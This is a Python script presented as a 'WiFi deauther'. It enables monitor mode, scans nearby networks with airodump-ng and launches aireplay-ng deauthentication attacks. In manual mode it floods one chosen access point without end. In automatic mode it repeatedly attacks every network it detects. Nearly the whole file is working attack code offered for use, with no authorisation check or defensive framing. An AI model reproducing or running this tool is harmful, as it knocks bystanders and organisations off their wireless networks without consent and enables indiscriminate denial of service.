#!/usr/bin/env python3


# for banner print_banner()

# timer big_countdown()



import subprocess
import os
import time
import re
import sys
from pathlib import Path

# ====================== BRIGHT COLORS ======================
class Colors:
    G = '\033[1;32m'   # Bright Green
    C = '\033[1;36m'   
    Y = '\033[1;33m'   
    R = '\033[1;31m'
    B = '\033[1;34m'
    M = '\033[1;35m'   
    W = '\033[1;37m'   
    N = '\033[0m'
    BOLD = '\033[1m'

def clear():
    os.system('clear')

def big_text(text, color=Colors.C):
    print(color + Colors.BOLD)
    for line in text.split('\n'):
        print(line.center(65))
    print(Colors.N)

def signal_bar(power):
    try:
        p = int(power)
        level = max(2, min(12, (p + 95) // 6))
        bar = "█" * level + "░" * (12 - level)
        color = Colors.G if p > -60 else Colors.Y if p > -75 else Colors.R
        return f"{color}{bar}{Colors.N} {p} dBm"
    except:
        return "N/A"

def big_countdown():
    print(f"{Colors.Y}[*] SCANNING NETWORK...{Colors.N}\n")
    for i in range(5, 0, -1):
        width = 35
        filled = int(width * (5 - i) / 5)
        bar = "█" * filled + "░" * (width - filled)
        print(f"   [{bar}]  {i} seconds ", end="\r")
        time.sleep(1)
    print(f"{Colors.G}[+] SCAN COMPLETE!{' ' * 40}{Colors.N}\n")

def print_banner():
    clear()
    print(f"{Colors.C}{Colors.BOLD}")
    print(f"\n{Colors.C}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.N}")
    print(f"          {Colors.W}{Colors.BOLD}        WIFI DEAUTHER BY ADITHYAN {Colors.N}")
    print(f"{Colors.C}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.N}\n")

def run(cmd):
    try:
        return subprocess.getoutput(cmd)
    except:
        return ""

# ====================== MAIN ======================
print_banner()

print(f"{Colors.Y}[*] Detecting wireless interfaces...{Colors.N}\n")
INTERFACES = [line.strip() for line in run("iw dev 2>/dev/null | grep -oP 'Interface \\K\\w+' | grep '^wlan'").splitlines() if line.strip()]

if not INTERFACES:
    print(f"{Colors.R}[!] No wlan interface found{Colors.N}")
    sys.exit(1)

for i, iface in enumerate(INTERFACES, 1):
    print(f"   {i}. {iface}")

try:
    num = int(input(f"\n{Colors.Y}Select interface → {Colors.W}"))
    IFACE = INTERFACES[num-1]
except:
    print(f"{Colors.R}Invalid selection!{Colors.N}")
    sys.exit(1)

print(f"{Colors.G}[+] Selected Interface: {IFACE}{Colors.N}\n")

# Monitor Mode
print(f"{Colors.Y}[*] Enabling monitor mode on {IFACE}...{Colors.N}")
run(f"ip link set {IFACE} down 2>/dev/null")
run(f"iw dev {IFACE} set type monitor 2>/dev/null")
run(f"ip link set {IFACE} up 2>/dev/null")
time.sleep(1.8)

if "monitor" in run(f"iw dev {IFACE} info 2>/dev/null").lower():
    print(f"{Colors.G}[+] Monitor mode enabled successfully{Colors.N}\n")
else:
    print(f"{Colors.Y}[!] Monitor mode failed (continuing anyway){Colors.N}\n")

# Clear the screen
clear()

# Mode Selection
print_banner()

print(f"{Colors.Y}Select Attack Mode:{Colors.N}")
print(f"     ")   # for gap
print(f"{Colors.W}[1] MANUAL [SELECTED NETWORK ATTACK]  {Colors.N}")
print(f"{Colors.W}[2] AUTOMATIC [AUTOMATICALLY ATTACK ALL NETWORK] {Colors.N}")


mode = input(f"\n{Colors.Y}Enter 1 or 2 → {Colors.N}").strip()

# ====================== MANUAL ======================
if mode == "1":
    while True:
        clear()


        big_countdown()

        subprocess.run(["pkill", "-9", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_path = Path("scan-01.csv")
        if csv_path.exists():
            csv_path.unlink()

        airodump = subprocess.Popen(["airodump-ng", "--band", "abg", "--write", "scan", "--output-format", "csv", IFACE],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        airodump.terminate()
        time.sleep(0.8)

        networks = []
        if csv_path.exists():
            try:
                with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) > 13 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', parts[0]):
                            bssid = parts[0]
                            ch = parts[3]
                            power = parts[8] if len(parts) > 8 else "0"
                            essid = parts[13].strip() or "Hidden"
                            if ch.isdigit():
                                networks.append((bssid, ch, essid, power))
            except: pass

        if not networks:
            print(f"{Colors.R}[!] No networks found{Colors.N}")
            time.sleep(2)
            continue

        
        print("-" * 85)
        for i, (bssid, ch, essid, power) in enumerate(networks, 1):
            print(f"[{i:2}] {essid:<25} CH:{ch:<3} {signal_bar(power)}   {bssid}")
        print("-" * 85)

        try:
            choice = input(f"\n{Colors.Y}Select target (0 = rescan): {Colors.N}").strip()
            if choice == "0": continue
            idx = int(choice) - 1
            TARGET_BSSID, TARGET_CH, TARGET_ESSID, _ = networks[idx]
        except:
            print(f"{Colors.R}Invalid selection!{Colors.N}")
            time.sleep(1.5)
            continue

        clear()
        
        big_text("TARGET LOCKED", Colors.G)
        print(f"ESSID  : {Colors.BOLD}{TARGET_ESSID}{Colors.N}")
        print(f"BSSID  : {TARGET_BSSID}")
        print(f"Channel: {TARGET_CH}\n")

        run(f"iw dev {IFACE} set channel {TARGET_CH} 2>/dev/null")
        print(f"{Colors.Y}[*] Starting deauth attack... (CTRL+C to stop){Colors.N}\n")

        try:
            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", TARGET_BSSID, IFACE])
        except KeyboardInterrupt:
            print(f"\n{Colors.Y}Attack stopped.{Colors.N}")

# ====================== AUTOMATIC ======================
else:
    while True:
        clear()
        
    
   

        big_countdown()

        subprocess.run(["pkill", "-9", "airodump-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        csv_path = Path("scan-01.csv")
        if csv_path.exists(): csv_path.unlink()

        airodump = subprocess.Popen(["airodump-ng", "--band", "abg", "--write", "scan", "--output-format", "csv", IFACE],
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        airodump.terminate()
        time.sleep(0.8)

        networks = []
        if csv_path.exists():
            try:
                with open(csv_path, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) > 13 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', parts[0]):
                            bssid = parts[0]
                            ch = parts[3]
                            power = parts[8] if len(parts) > 8 else "0"
                            essid = parts[13].strip() or "Hidden"
                            if ch.isdigit():
                                networks.append((bssid, ch, essid, power))
            except: pass

        if not networks:
            print(f"{Colors.R}[!] No networks found. Retrying...{Colors.N}")
            time.sleep(2)
            continue

        big_text(f"FOUND {len(networks)} NETWORKS", Colors.G)
        print("-" * 85)
        for i, (bssid, ch, essid, power) in enumerate(networks, 1):
            print(f"[{i:2}] {essid:<25} CH:{ch:<3} {signal_bar(power)}   {bssid}")
        print("-" * 85 + "\n")

        for bssid, ch, essid, power in networks:
            clear()
           
            big_text("ATTACKING", Colors.Y)
            print(f"Network : {Colors.BOLD}{essid}{Colors.N}")
            print(f"Signal  : {signal_bar(power)}")
            print(f"BSSID   : {bssid} | CH: {ch}\n")

            run(f"iwconfig {IFACE} channel {ch}")

            print(f"{Colors.Y}[*] Sending deauth packets...{Colors.N}")
            try:
                subprocess.run(["aireplay-ng", "-0", "4", "-a", bssid, IFACE],
                             timeout=12, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except: pass
            time.sleep(2)

        print(f"\n{Colors.G}Cycle completed. Restarting scan...{Colors.N}")
        time.sleep(3)